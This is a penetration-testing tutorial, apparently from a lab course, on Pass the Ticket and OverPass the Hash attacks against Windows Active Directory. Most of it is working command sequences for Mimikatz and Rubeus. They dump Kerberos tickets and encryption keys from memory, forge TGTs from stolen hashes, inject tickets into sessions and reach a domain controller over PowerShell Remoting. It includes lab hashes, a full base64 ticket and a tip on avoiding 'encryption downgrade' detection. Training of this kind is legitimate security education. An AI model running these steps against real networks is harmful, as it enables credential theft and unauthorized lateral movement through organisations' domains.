# Pass the Ticket (PtT) from Windows
Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. We'll cover several ways to perform a PtT attack from Windows and Linux. In this section, we'll focus on Windows attacks, and in the following section, we'll cover attacks from Linux.

## Pass the Ticket (PtT) Attack
We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:

    - `Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.`
    - `Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.`

Before we perform a Pass the Ticket (PtT) attack, let's see some methods to get a ticket using Mimikatz [https://github.com/ParrotSec/mimikatz] and Rubeus [https://github.com/GhostPack/Rubeus].

### Harvesting Kerberos Tickets from Windows
#### Mimikatz - Export Tickets
```
> mimikatz.exe
> privilege::debug
> sekurlsa::tickets /export
> exit
> dir *.kirbi
```

The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.

`Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.`


- `Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.`

#### Rubeus - Export Tickets
```
> Rubeus.exe dump /nowrap
```

`Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.`

This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the OverPass the Hash or Pass the Key technique.

## Pass the Key or OverPass the Hash
The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT). This technique was developed by Benjamin Delpy and Skip Duckwall in their presentation Abusing Microsoft Kerberos - Sorry you guys don't get it. Also Will Schroeder adapted their project to create the Rubeus tool.

To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.

### Mimikatz - Extract Kerberos Keys
```
> mimikatz.exe
> privilege::debug
> sekurlsa::ekeys
```

Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.

#### Mimikatz - Pass the Key or OverPass the Hash
```
> mimikatz.exe
> privilege::debug
> sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.

To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.

#### Rubeus - Pass the Key or OverPass the Hash
```
> Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /nowrap
```

`Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.`


`Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."`

## Pass the Ticket (PtT)
Now that we have some Kerberos tickets, we can use them to move laterally within an environment.

With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.

### Rubeus Pass the Ticket
```
> Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /rc4:c4b0e1b10c7ce2c4723b4e2407ef81a2 /ptt
```

Note that now it displays Ticket successfully imported!.

Another way is to import the ticket into the current session using the .kirbi file from the disk.

Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.

### Rubeus - Pass the Ticket
```
> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi`
```

We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.

### Convert .kirbi to Base64 Format
```
PS > [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))`
```

Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.

### Pass the Ticket - Base64 Format
```
> Rubeus.exe ptt /ticket:  doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFpbmxhbmVmcmVpZ2h0Lmh0YqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6achxvCNYTFWQq8vRODrOPHeztKqfJZJ/0d/1Klcd/wzzHUtrRwyl+aPiVpUaWIsmBohBC3QJP4v0EgMs0YHmMXXCoB5ZtLtnvw2bAmWUzzWr6puFOf94ViYdkanCbwK0UcIrZYmHcjAYuJ/kwY95cWmgdR5vEmc0DH4UMg1/CIZ6vPcc8QSOEW84xNJGkLfqi1oj9rMfUZ91T/crPZPKn1pL2JnLeAWUtzL0PQ8/4v5gnnC8dT8tjo0vC5zhmvxrs/8mwMVjU/ef0hNDt7W2XkwV8byDL8hKkgtXmYdlLySK0YKXoKjcYIIYUNyGghbZ0GrlWQx1/7JukyV20inRUsH5HW3e69V8q4+QgeHiXiQM3wFYt1p0LeaGsKUGLDz9TkDJiWNQSAejhjV5cMX7ZcBnj3oLZxyvHlVM1JWbilum4GxIDr4a8kUo3QNu7KbXhSmsWc6bQf9ZpxAq+l7Sj0M1bq9OX5//bqrtTLooXVOAai6lI6irtm0Nq8j2tuo0xbpWoMNA/JMdCLwv1EtGAmgPR4S01Vn57EwFwKQIKC3UU0FzKhBYX1HwW3yLLbNv5oZCaLH0CDiC3nUo89zPvbxfX5rZAqgA3wgnXBpGCNVAiF8CpEtbdc++r6rj87kf+2hDgdZ+gGyJgPXRCcrh64tlLwTlFWqIrvfllJpuElHNHxffq5F8MRQbuG9LSMeg3M4rxdsWYcHNHPQrx2PaAcL79s38GrB5d+w0mMnqs7IeHUY7o1GKVI6/5vohOjRGX8a+6Kfw8IgClGZozOxNyPzt0b0iibraEqycjBuuK0oReYGbOVhQtc9mDh8MDSVPsQb7Iw8Xa8ANRmSuI5QvkhlaPR+4zk39scpkst6kz6gLM9OUMmAB8Ui5Z2wd0Z39okn2B2rOWWcXWc6hYzMhryBQ8Ot+24chW3BoniXad0ZTrKHbKXPcIzc6CP6p/OG9cPwkY9SoDE7z9wZMyrtwDlfGNjVDTm7au3cYlsio6N7JUl95jJtfaYgF+34zBH6OxdsaK4E5asgxiO6BHzTs3JL+fsA5uuiB4BdaUcroN2wASM03YDnMWXs/J+9HeOisCT+PJtKO4Zz6G5VR3Fsn7OjNWbfuATkI/0q0LCxLTmM11yODh3hUMJEpml5RtHIQmWWOq3PFaY3+2PtpOUa6e0NBg0psWzPZdC2VH9uQ4T4d+Cc/GY2WCaw4mevkRdYbGRy9oH6be0mJojh96nObVw5wh4b5jMTyEoLPgWUTnDKXBamYavSnfpCn9FUxv1E3MvSKntfWVoh/7hwidjl1hZ8KTDDj9YoKk4AfcBroZpf79//9U1U4hKeqm7pLV0TUGZY6le458z8SmVYbEx9Uedc9GnMLutxDCR7RKWKTzFnAztattTLMRw8qx6bhWhx7CYf9LVuuCKj6RXw3xFHKj3Lr67zLA/L/Kx+jgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCBLj1p9IRkM2PHR+ehW/OPT/plYQ7hN71vQiTET7lli7qETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNDAzMjQxMTIxMThaphEYDzIwMjQwMzI0MjEyMTE4WqcRGA8yMDI0MDMzMTExMjExOFqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEWlubGFuZWZyZWlnaHQuaHRi
```

Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.

### Mimikatz - Pass the Ticket
```
> mimikatz.exe 
> privilege::debug
> kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
> exit
> dir \\DC01.inlanefreight.htb\c$
```

`Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.`

### Pass The Ticket with PowerShell Remoting (Windows)
To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.

#### Mimikatz - PowerShell Remoting with Pass the Ticket
```
> mimikatz.exe
> privilege::debug
> kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
> exit
> powershell
```

#### Rubeus - PowerShell Remoting with Pass the Ticket
##### Create a Sacrificial Process with Rubeus
```
> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.

##### Rubeus - Pass the Ticket for Lateral Movement
```
> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
> powershell
> Enter-PSSession -ComputerName DC01
```